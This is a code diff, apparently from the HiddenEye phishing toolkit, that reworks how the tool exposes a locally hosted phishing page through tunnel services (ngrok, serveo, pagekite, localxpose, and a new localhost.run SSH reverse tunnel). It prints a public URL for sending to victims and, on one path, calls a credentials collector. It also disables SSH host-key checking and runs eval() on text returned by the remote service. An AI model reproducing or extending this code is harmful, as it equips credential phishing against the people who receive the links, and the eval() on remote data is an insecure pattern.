@@ -56,19 +56,13 @@ def server_selection(port):  # Question where user must select server
         start_localhost(port)  # FIXED
     elif choice == "01":
         run_command("clear")
-        #  start_ngrok(port)  #  FIXME replace this shit with MVC
-        NgrokController().close_latest_connection()
-        TerminalController().clear()
-        NgrokController().maintain_default_config()
-        NgrokController().activate_config_path()
-        NgrokController().establish_connection(port=port)
-        print(NgrokController().ngrok_url)
+        start_ngrok(port)   #FIXED
     elif choice == "02":
         run_command("clear")
-        start_serveo(port)  # TODO ALMOST FIXED
+        start_serveo(port)
     elif choice == "03":
         run_command("clear")
-        start_localxpose(port)  # TODO DOESN'T GET ENTERED CREDENTIALS BACK
+        start_localhostrun(port)
     elif choice == "04":
         run_command("clear")
         start_localtunnel(port, True)
@@ -78,6 +72,9 @@ def server_selection(port):  # Question where user must select server
     elif choice == "06":
         run_command("clear")
         start_pagekite(port)
+    elif choice == "07":
+        run_command("clear")
+        start_localxpose(port)
     else:
         run_command("clear")
         return server_selection(port)
@@ -112,7 +109,7 @@ def start_localhost(port):
     print(localization.lang_start_localhost["localhost_server"])
     host = "127.0.0.1"
     print(localization.lang_start_localhost["your_localhost_is"] + host)
-    set_port()
+    set_port(port)
 
     set_php(host, port)
     print(localization.lang_start_localhost["starting_server_on_addr"] +
@@ -131,38 +128,33 @@ def start_localhost(port):
 
 
 def start_ngrok(port):
-    ngrok_conf.PyngrokConfig(config_path=".config/ngrok.yml")
-    pid = check_process("ngrok")
-    for p in pid:
-        kill(p, signal.SIGKILL)
-    # continue
-    run_command("clear")
+    ngrokController=NgrokController()
+    ngrokController.close_latest_connection()
+    TerminalController().clear()
     print(global_localization.hidden_eye_logo)
     print(global_localization.official_website_link)
     print(global_localization.by_darksec)
     print(global_localization.line_of_dots)
     print(localization.lang_start_ngrok["ngrok_server"])
-    ngrok.connect(port=int(port))#TODO done
-    while True:
-        wait(2)
-        ngrok_tunnels = ngrok.get_tunnels()
-        url = ngrok_tunnels[0].public_url
-        if regular_expression.match("https://[0-9a-z]*\.ngrok.io",
-                                    url) is not None:
-            print(localization.lang_start_ngrok["send_this_url_suggestion"])
-            print(localization.lang_start_localhost["localhost_url"] +
-                  "127.0.0.1:" + port)
-            print(localization.lang_start_ngrok["ngrok_url"] + url +
-                  default_palette[4])
-            break
+    ngrokController.maintain_default_config()
+    ngrokController.activate_config_path()
+    ngrokController.establish_connection(port=port)
+    print(localization.lang_start_ngrok["send_this_url_suggestion"])
+    print(localization.lang_start_localhost["localhost_url"] +
+            "127.0.0.1:" + port)
+    print(localization.lang_start_ngrok["ngrok_url"] +
+            ngrokController.ngrok_url)
 
 
 def start_serveo(port):
     def is_online():
-        serveo = requests.get("http://serveo.net")
-        if "temporarily disabled" in serveo.text:
+        try:
+            serveo = requests.get("http://serveo.net" ,timeout=5)
+            if "temporarily disabled" in serveo.text:
+                return False
+            return True
+        except:
             return False
-        return True
 
     def random(port):
         run_command("clear")
@@ -257,7 +249,7 @@ def start_serveo(port):
             run_command("clear")
             return custom(port)
 
-    if is_online:
+    if is_online():
         print(global_localization.hidden_eye_logo)
         print(global_localization.official_website_link)
         print(global_localization.by_darksec)
@@ -468,7 +460,7 @@ def start_openport(port):
     run_command("clear")
 
     def manage_url(port):
-        run_command("rm output.txt > /dev/null 2>&1")
+        run_command(["rm", "output.txt", ">", "/dev/null", "2>&1"])
         run_command("openport -K && openport %s > output.txt &" % (port))
         print(
             "{0}[{1}*{0}] {1}Openport Server Running in Background.. Please wait."
@@ -528,7 +520,7 @@ def start_openport(port):
 		{0}http://github.com/darksecdevelopers
 		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------"""
           .format(default_palette[0], default_palette[2]))
-    if 256 == run_command("which openport > /dev/null"):
+    if 256 == run_command(["which", "openport", ">", "/dev/null"]):
         run_command("clear")
         print(
             "[*] Openport not Installed correctly, Try installing it manually !!"
@@ -592,3 +584,34 @@ def start_pagekite(port):
         except KeyboardInterrupt:
             print("[!] Please Copy the Generated Link For Further Use")
             credentials_collector(port)
+
+def start_localhostrun(port):
+    print(global_localization.hidden_eye_logo)
+    print(global_localization.official_website_link)
+    print(global_localization.by_darksec)
+    print(global_localization.line_of_dots)
+    run_background_command(
+            [
+                "ssh",
+                "-o",
+                "StrictHostKeyChecking=no",
+                "-o",
+                "ServerAliveInterval=60",
+                "-R",
+                "80:localhost:{0}".format(port),
+                "ssh.localhost.run",
+            ],
+            stdout=open('link.url','w'),
+            stdin=DEVNULL,
+            stderr=DEVNULL,
+            start_new_session=True,
+        )
+    wait(10)
+    lines=check_output(['cat','link.url']).decode().split('\n')
+    url='http://'+eval(lines[1])['domain']
+    print(localization.lang_start_localhostrun["localhostrun_server"])
+    print(localization.lang_start_localhostrun["send_this_url_suggestion"])
+    print(localization.lang_start_localhost["localhost_url"] +
+            "127.0.0.1:" + port)
+    print(localization.lang_start_localhostrun["localhostrun_url"] +
+            url)
